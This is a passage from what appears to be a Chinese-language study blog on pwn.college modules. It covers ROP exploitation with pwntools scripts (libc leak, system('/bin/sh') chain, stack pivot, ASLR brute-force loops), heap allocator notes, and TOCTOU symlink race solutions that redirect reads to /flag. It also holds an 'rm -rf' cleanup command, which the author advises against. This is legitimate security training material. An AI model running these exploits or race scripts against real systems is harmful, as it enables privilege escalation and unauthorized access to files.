class="hljs-number">0x401b33</span>, elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>], elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>], elf.sym[<span class="hljs-string">&#x27;challenge&#x27;</span>]])<br>sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *challenge+0x39</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>p.sendline(pl)<br>p.recvuntil(<span class="hljs-string">b&#x27;ving!\n&#x27;</span>)<br>puts = <span class="hljs-built_in">int</span>.from_bytes(p.recv(<span class="hljs-number">6</span>), byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>), <span class="hljs-number">0x401b33</span>, binsh, sys])<br>p.sendline(pl)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><h4 id="level9-3"><a href="#level9-3" class="headerlink" title="level9"></a>level9</h4><p><strong>stack pivot!!!!</strong> </p><p>以前做过了.</p><p>pop_rbp, bss_s<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="这里要指向2处的地址, 也就是bss+0x10">[1]</span></a></sup>, challenge || leave_ret, 0(useless rbp), pop_rdi<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="这里开始就是从改变后的rsp弹出返回地址. 开始准备通过puts来leak处libc地址.">[2]</span></a></sup> || got[puts], plt[puts]<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="这之后要接收puts的地址.">[3]</span></a></sup>, pop_rdi || str_binsh, system.</p><h4 id="level10-3"><a href="#level10-3" class="headerlink" title="level10"></a>level10</h4><p>开了PIE, 而且win是用mmap分配到一个随机的地址, 然后只给读和执行的权限, 所以主要利用的gadget还是在libc_csu_init里面的. 而aslr的开启导致stack的位置也是未知的.</p><p><del>由于gadget是在rodata段, ROPgadget无法分析, 所以在pwndbg中使用rop命令来分析mmap+mprotect后的区域.</del><br><del>注意只有最后3位是有用的.</del>  rodata段是win函数, 通过mmap+memcpy复制到高地址空间中.</p><blockquote><p>如果该段不可执行ropgadget也不会对这里进行分析.</p></blockquote><hr><p>不过在这一题中<strong>直接给出了buf的位置</strong>.</p><p>mmap的空间总是在ld共享库的上方, 和stack没有关联. 不过challeng中mmap的返回值就存在栈上, 也就是buf的上方8字节.<br>需要栈转移来将这个指针作为ret_address, 这样就可以直接跳到win.</p><p>因为有aslr, 所以gadget之间的数据需要固定一个值, 这个值可以在开了aslr的gdb中获取, 然后不断尝试直到新的一次第四位刚好和选中的值相等.</p><p>这次的幸运数字是0xd57000. 所有在ida看到的地址都要加上这一个偏移量.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level10.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    p = process(binary)<br>    sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b *challenge+0x109</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: 0x&#x27;</span>)<br>    buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>    pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x88</span>), buf-<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;\x3b\x87&#x27;</span>])<br><br>    p.send(pl)<br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>: <br>        p.kill()<br></code></pre></div></td></tr></table></figure><p>远程跑总是有点问题, 没法调试. 懒得管了.</p><img src="../../image/pwn-modules/image-20220507162940280.png" alt="image-20220507162940280" style="zoom:80%;" /><h4 id="level11-3"><a href="#level11-3" class="headerlink" title="level11"></a>level11</h4><p>和上一题一样, 不过challenge()函数的主逻辑前后都加上了超级多的nop作为填充. 这有啥用?</p><p>确实没有区别. 改一改偏移量就过了.</p><h4 id="level12-2"><a href="#level12-2" class="headerlink" title="level12"></a>level12</h4><p>保护没有变化. 这又有什么区别?? 0号程序还提供了win函数的地址, 这不白给么.</p><ul><li>突然就不行了, 使用gdb的record来查找问题, 好像只能在当前执行过程中使用save和restore命令.</li><li>ROPgadget使用only命令的时候想要的命令要全部打出来, 而不仅是或的关系.</li><li><code>find /tmp -atime +5 -exec rm -rf &#123;&#125; +</code> 还是别用了.</li><li><code>egrep &#39;(pop (rbp|rsp))|leave&#39; -a libc233.gadget</code> ==<br><code>ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.33.so --only &#39;pop|ret&#39;</code> </li></ul><p>这题原来指的是从libc中进行ROP, 因为main函数返回到了高地址中的libc.so中.可以直接在libc文件中搜索可执行的ROP段.<del>也不一定要leave, <code>pop rsp</code>不照样行.</del>还是不行. 乖乖leave吧.</p><p>2.33中:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#0x000000000004e250 : leave ; ret</span><br><span class="hljs-number">0x000000000002798b</span> : pop rsp ; ret  <br><span class="hljs-number">0x0000000000027e3f</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret<br><span class="hljs-number">0x0000000000027c27</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret<br></code></pre></div></td></tr></table></figure><blockquote><p>2.31中:</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-number">0x00000000000578f8</span> : <span class="hljs-keyword">leave</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x00000000000c7ad3</span> : <span class="hljs-keyword">leave</span> <span class="hljs-comment">; ret 0xfff6</span><br></code></pre></div></td></tr></table></figure><p>main返回地址到libc偏移: 0x270b3</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#这个是main函数的返回地址</span><br>pwndbg&gt; vmmap <span class="hljs-number">0x7efef009a7ed</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x7efef0099000</span>     <span class="hljs-number">0x7efef01e1000</span> r-xp   <span class="hljs-number">148000</span> <span class="hljs-number">26000</span>  /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2.33</span>.so +<span class="hljs-number">0x17ed</span><br>    <br><span class="hljs-comment">#到libc初始的偏移是`0x277ed`:</span><br>pwndbg&gt; distance <span class="hljs-number">0x7f6b0c0fb000</span> <span class="hljs-number">0x7f6b0c1227ed</span><br><span class="hljs-number">0x7f6b0c0fb000</span>-&gt;<span class="hljs-number">0x7f6b0c1227ed</span> <span class="hljs-keyword">is</span> <span class="hljs-number">0x277ed</span> <span class="hljs-built_in">bytes</span> (<span class="hljs-number">0x4efd</span> words)<br></code></pre></div></td></tr></table></figure><p>诶得16*16*16分之1的几率啊, 这也太低了点, 不过想不出来了, 就这么干. <code>0x254000+0x4e250=0x2A2250</code> </p><blockquote><p><del>又发现地址好像和libc没什么关系, 是紧挨着ld.so的…</del> 这个方向错了</p><img src="../../image/pwn-modules/image-20220508231821229.png" alt="image-20220508231821229" style="zoom:67%;" /> </blockquote><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level12.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    p = process(binary)<br>    sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b *main+0x19f</span><br><span class="hljs-string">    init-pwndbg</span><br><span class="hljs-string">    lm</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: 0x&#x27;</span>)<br>    buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>    pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x48</span>), buf-<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;\x50\x22\x2a&#x27;</span>])<br><br>    p.send(pl)<br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">all</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        p.kill()<br></code></pre></div></td></tr></table></figure><h4 id="level13-2"><a href="#level13-2" class="headerlink" title="level13"></a>level13</h4><p>看看这题又要搞什么幺蛾子.</p><p>保护全开, 给出buf位置, 可以leak任意一个地址上8字节数据.</p><p>???这不leak一个canary出来, 然后返回地址改成….和上一题一样了. ret2libc</p><h4 id="level14-1"><a href="#level14-1" class="headerlink" title="level14"></a>level14</h4><p>socket</p><h1 id="module-B-heap"><a href="#module-B-heap" class="headerlink" title="module B-heap"></a>module B-heap</h1><h4 id="key"><a href="#key" class="headerlink" title="key:"></a>key:</h4><ul><li><p>Dynamic Allocators:</p><ul><li>General Purpose: Doug Lea (pictured) releases <strong>dlmalloc</strong> into public domain in 1987.</li><li>Linux: <strong>ptmalloc</strong> (Posix Thread aware fork of dlmalloc)</li><li>FreeBSD: <strong>jemalloc</strong> (also used in Firefox, Android)</li><li>Windows: Segment Heap, <strong>NT Heap</strong></li><li>Kernel allocators: <strong>kmalloc</strong> (Linux kernel memory allocator)kalloc (iOS kernel memory allocator)</li></ul></li><li><p>managed by the brk and sbrk system calls:</p><ul><li>sbrk(NULL) returns the end of the data segment</li><li>sbrk(delta) expands the end of the data segment by delta bytes</li><li>brk(addr) expands the end of the data segment to addr</li></ul></li></ul><p>ubuntu 2004还在图中粗线框的阶段, 这是由于tcache的引入. 不过这个module并不会深入这个cache.</p><img src="../../image/pwn-modules/image-20220505165437735.png" alt="image-20220505165437735" style="zoom: 50%;" /><ul><li><p>tcache: </p><ul><li>a <strong>caching</strong> layer for “small” allocations (&lt;1032 bytes on amd64)</li><li>makes a <strong>singly-linked-list</strong> using the first word of the free chunk</li><li><strong>very few</strong> security checks</li></ul></li><li><p>setvbuf: scanf and printf will use malloc in themselves for buffering, we can use <code>setvbuf(stdin/out, NULL)</code> to disable it. (and avoiding confusion in heap exploitation.)</p></li><li><p>ptmalloc caches(for review):</p><ul><li>64 singly-linked tcache bins for allocations of size 16 to 1032(functionally “covers” fastbins andsmallbins)</li><li>10 singly-linked “fast” bins for allocations of size up to 160 bytes</li><li>1 doubly-linked “unsorted” bin to quickly stash <strong>free()d</strong> chunks that don’t fit into tcache orfastbins</li><li>64 doubly-linked “small” bins for allocations up to 512 bytes</li><li>doubly-linked “large” bins (anything over 512 bytes) that contain different-sized chunks</li></ul></li><li><p>The Unlink Attack, Poison Null Byte</p></li><li><p><a href="https://docs.google.com/presentation/d/14SYq0TTVxEGWHNUG1BP66A8liPDD2pqJUs2WrXlCZNE/edit#slide=id.g47fd1f5b33_0_204">further reading</a>. </p></li></ul><p><a href="https://sourceware.org/glibc/wiki/MallocInternals">malloc internals</a> </p><p><a href="https://seclists.org/bugtraq/2005/Oct/118">the rise of houses</a> </p><h1 id="module-C-race"><a href="#module-C-race" class="headerlink" title="module C-race"></a>module C-race</h1><h4 id="key-points"><a href="#key-points" class="headerlink" title="key points"></a>key points</h4><ul><li>在一个程序打开文件并写入然后再到执行它的期间进程可能被调度, 这个时候如果文件被改写那么就会出现竞态条件.</li><li>如果这个窗口太短那么竞态条件出现的几率就会更小</li><li>有一个系统调用<strong>nice</strong>, 对应于nice命令, 还有一个ionice, 就是字面意思上的run a program with modified scheduling priority</li><li>通过非常长的路径搜索可以减慢程序执行, 进而加大竞态窗口. 可以使用符号链接来循环查找同一根目录下的多条长路径, 来达到同样的效果.</li></ul><img src="../../image/pwn-modules/image-20220511235547367.png" alt="image-20220511235547367" style="zoom: 67%;" /><ul><li>Mitigations<ol><li>Safer programming practices (O_NOFOLLOW, mkstemp(), etc).</li><li>Symlink protections in /tmp<br> a. root cannot follow symlinks in /tmp that are owned by other users<br> b.specifically made to prevent these sorts of issues</li></ol></li><li>非libc的库函数要直接进行编译要给gcc传递相应的链接参数.</li><li>pthread:<ul><li><code>pthread_t</code> | <code>pthread_create()</code> | <code>pthread_join()</code>:waits for the thread specified by thread to terminate.</li><li>实际用的是<code>clone()</code>系统调用.</li></ul></li><li>discrepancies between <strong>libc call</strong> and <strong>raw syscall</strong>: <ul><li>setuid() in libc sets the uid for all threads of the process, raw syscall will only set the caller thread.</li><li>exit() in libc will call exit_group(), so exit all threads, but raw syscall only exit caller thread.</li></ul></li><li>实际中常使用全局变量来控制线程的执行.</li><li>对内存的读写同样会产生竞态条件.</li><li>Data races: 自增的多步骤指令. 不过可以通过上锁解决.</li><li>Detect: valgrind, <a href="https://docs.google.com/presentation/d/1u-aSz-mqwkMIZEDAR-AEPKw5JPn-1q_3Ek_C6JjQUzY/edit#slide=id.gac4ec7d1a7_0_49">学术界</a> </li><li>signals and reentrancy: <ul><li>use signal to interrupt normal execution control flow.</li><li>use signal function to reenter function.</li><li>DO NOT call non-reentrant funtions in your signal handlers.<ul><li>Your handler might have interrupted those functions mid-execution.</li><li>Another signal might interrupt your signal handler’s non-reentrant invocations mid-execution!</li><li>Depending on settings (<code>SA_NODEFER</code> flag to sigaction()), another iteration of the same signal might interrupt your signal!</li></ul></li><li><code>man signal-safety</code> to see all reentrant libc funtions.</li></ul></li></ul><blockquote><p>YouTube-50是babyrace的视频. level5做不下去了准备看看.</p></blockquote><p><strong>补充:</strong> </p><ul><li><p>level5 shell script问题出在rm mv都有一个启动时间和一堆系统调用, 再加上shell是靠fork+exec来执行进程的, 所以就会比较慢, 可能会出现左图中的情况, 就算把几个命令分开进多个循环也还是太慢. 如果写进c, 那就是右图中的理想状态了:<br><img src="../../image/pwn-modules/image-20220516162810899.png" alt="image-20220516162810899" style="zoom:80%;" /><img src="../../image/pwn-modules/image-20220516163018313.png" alt="image-20220516162810899" style="zoom:80%;" /> </p></li><li><p>使用python的话启动比较慢是事实, 但是进入执行之后到系统调用层面是和c差不多的, 所以只要在python里面进行loop就能达到一样的效果. 想起来前几天看的dirty cow使用的race condition的poc就是用c写的.</p><ul><li>python的话要大量使用到os module来调用系统. 可得好好看看.(练了练shell也不亏就是了)</li></ul></li></ul><h4 id="prepare"><a href="#prepare" class="headerlink" title="prepare"></a>prepare</h4><p>先整个创建超级长的路径的脚本. 顺便学了学shell编程.</p><p>难怪视频里只见到t_end, 因为这样路径上每个文件夹其实都是符号链接, 所以最多20个.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>prefix=&#x27;a&#x27;<br>ln -s $(pwd) ./root<br>for i in &#123;97..116&#125;#或者直接用&#123;a..t&#125;<br>do<br>    prefix=$(printf &quot;\\x$(printf %x $i)&quot;)<br>    pushd .<br>    mkdir $prefix<br>    cd $prefix<br>    for j in &#123;1..25&#125;<br>    do<br>        mkdir ./$j<br>        cd ./$j<br>    done<br>    innerwd=$(pwd)<br>    popd<br>    cp -a ./root $innerwd<br>    ln -s $innerwd $(pwd)/$&#123;prefix&#125;_end<br>done<br></code></pre></div></td></tr></table></figure><p>生成路径字符串: 如果路径上还有符号链接那还得再减少几个.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>prefix=&#x27;a&#x27;<br>path=&#x27;./&#x27; <br>for i in &#123;97..116&#125; #或者直接用&#123;a..t&#125;<br>do<br>    prefix=$(printf &quot;\\x$(printf %x $i)&quot;)<br>    path+=$&#123;prefix&#125;_end/root/<br><br>done<br>ls $path#test path(though must be true...)<br><span class="hljs-meta">#</span><span class="bash">result is:</span><br>./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/t_end/root/<br></code></pre></div></td></tr></table></figure><h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1"></a>level1</h4><p>在程序使用第一个参数当做字符串open文件之前直接停下来等我, 这个时候就可以更改flag的符号链接为那个名字, 于是绕过了不能含有’flag’字符和不能是符号链接的限制.</p><h5 id="1程序的补充shell"><a href="#1程序的补充shell" class="headerlink" title=".1程序的补充shell"></a>.1程序的补充shell</h5><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>rm aa bb cc 2&gt;/dev/null<br>touch aa<br>ln -s /flag ./cc<br><span class="hljs-meta">#</span><span class="bash">一开始是一个普通文件, 然后改成到/flag的符号链接</span><br>while [ 1 ]<br>do<br>    #sleep 0.05 #不知道有没有用的说...希望有. 果然没用<br>    mv bb aa <br>    sleep 0.0005<br>    mv aa bb<br>    mv cc aa<br>    sleep 0.0005<br>    mv aa cc<br>done<br></code></pre></div></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">持续执行challenge的shell</span><br><br>path=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/<br><br>while [[ 1 ]]<br>do<br>    res=$(/challenge/babyrace_level1.1 $&#123;path&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        printf &quot;\n$res\n\n&quot;<br>        exit<br>    fi<br>done<br></code></pre></div></td></tr></table></figure><p>删除一堆文件夹:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">rm -r !(peda|*sh)<br></code></pre></div></td></tr></table></figure><h5 id="成功率比较"><a href="#成功率比较" class="headerlink" title="成功率比较"></a>成功率比较</h5><blockquote><p>改成短路径之后进行了一下成功率比较:</p></blockquote><p>比较shellscript: </p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">持续执行challenge的shell</span><br><br>path=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/<br>path_2=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/<br>rate=0<br>rates=0<br>ratess=0<br>for i in &#123;1..1000&#125;<br>do<br>    res=$(/challenge/babyrace_level1.1 $&#123;path&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((rate++))<br>    fi<br><br>    res=$(/challenge/babyrace_level1.1 $&#123;path_2&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((ratess++))<br>    fi<br><br>    res=$(/challenge/babyrace_level1.1 ./aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((rates++))<br>    fi<br>done<br>echo longpath: $rate/1000<br>echo path_2: $ratess/1000<br>echo shortpath: $rates/1000<br></code></pre></div></td></tr></table></figure><p>结果:</p><p>不带sleep:</p><img src="../../image/pwn-modules/image-20220515153055539.png" alt="image-20220515153055539" style="zoom:80%;" /><p>带了sleep(0.05s):</p><img src="../../image/pwn-modules/image-20220515153138069.png" alt="image-20220515153138069" style="zoom:80%;" /><p>和好多因素有关, 不过不用sleep看起来更高效, 但是没见到长路径带来的好处…….</p><p>好了, 有了新发现, 产生竞态条件的shell脚本中第一个sleep看起来没什么意义然后尝试删除, <strong>成功率直接大幅上涨</strong>:</p><img src="../../image/pwn-modules/image-20220515155725438.png" alt="image-20220515155725438" style="zoom:80%;" /><p>不过长路径还是没啥作用. 如果不加上<strong>sleep 0.0005</strong>, 那么成功率直降为5/1000.</p><p>会随着sleep的时间波动, 还是0.0005最高. 在0.005的时候出现path_2的成功率最高. 全都是迷之行为, 至于nice就不试了….</p><h4 id="level2-2"><a href="#level2-2" class="headerlink" title="level2"></a>level2</h4><p>完全一样</p><h4 id="level3-3"><a href="#level3-3" class="headerlink" title="level3"></a>level3</h4><p>在前两题的基础之上检查大小不能超过256字节, 而且在buf[256]之后有一个控制进入win()的v7, 改改文件名很容易绕过</p><p>看了office hours, 用了python的os模块, 尝试了os.fork+分开unlink和symlink+strace程序的系统调用时间并分析窗口(这个窗口比较小). 没试出来什么更好的结果. </p><h4 id="level4-4"><a href="#level4-4" class="headerlink" title="level4"></a>level4</h4><p>利用上面的方法更改打开文件进行栈溢出然后改跳转地址跳转到win().</p><p>什么保护都没开, 固定地址加载.</p><h4 id="level5-5"><a href="#level5-5" class="headerlink" title="level5"></a>level5</h4><blockquote><p>思考的一些过程……</p><p>接受一个绝对路径, 除了一些检查(symlink, argname), 还有文件所在目录所有者只能是root, 其他用户没有在此文件夹写的权限.</p><p>???? 不过在看了看dirname的实现之后发现并不需要一个绝对路径.</p><img src="../../image/pwn-modules/image-20220512222315120.png" alt="image-20220512222315120" style="zoom:80%;" /><ul><li>这样的话, <del>参数就定成/home/hacker下的e(0 size file),</del>  </li></ul></blockquote><p>dirname()只是一个字符串操作, 会截取前面的一部分路径. 所以不能在参数中使用相对路径, 否则dirname会返回当前文件夹: <code>.</code>, 这样没法绕过dirname, 工作目录又不能改成除了hacker之外的.</p><p>第一阶段只判断了文件存在与否以及符号链接(no follow lstat), 第二阶段才判断目录信息(use dirname() strip argv[1], and follow link stat), 第三阶段是真正的打开文件.</p><ul><li>首先touch一个/home/hacker/aa/bb文件, 通过name和symlink验证, </li><li>然后ln两个/home/hacker/aa -&gt; /home, 不用管bb其实根本不在/home中.</li><li>最后再ln一个/home/hacker/aa/bb -&gt; /flag</li></ul><p>也许有更好的办法, :</p><ul><li>最开始创建<code>./1/aa/bb(plain file)</code>, <code>./2/aa -&gt; /home</code>, <code>./3/aa/bb -&gt; /flag</code></li><li>然后创建一个symlink叫做dir.</li><li>首先指向<code>./1</code>, 然后指向<code>./2</code>, 最后指向<code>./3</code>.</li><li>这样只要每次unlink dir然后再symlink相应数字文件夹名就行了.<br>完整路径名为<code>/home/hacker/dir/aa/bb</code> </li><li>由于这样子实在太快导致窗口时间都跟不上了. 添加sleep, 大概是0.0001s</li></ul><h5 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h5><p>写了一个脚本避免重复输入一些命令, 不过想清楚之后倒是一遍过了.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>if [ $1 == &#x27;init&#x27; ]<br>then<br>    cd<br>    mkdir a<br>    cd a<br>    touch b<br>elif [ $1 == 2 ]<br>then<br>    cd<br>    mv a b<br>    ln -s /home /home/hacker/a<br>elif [ 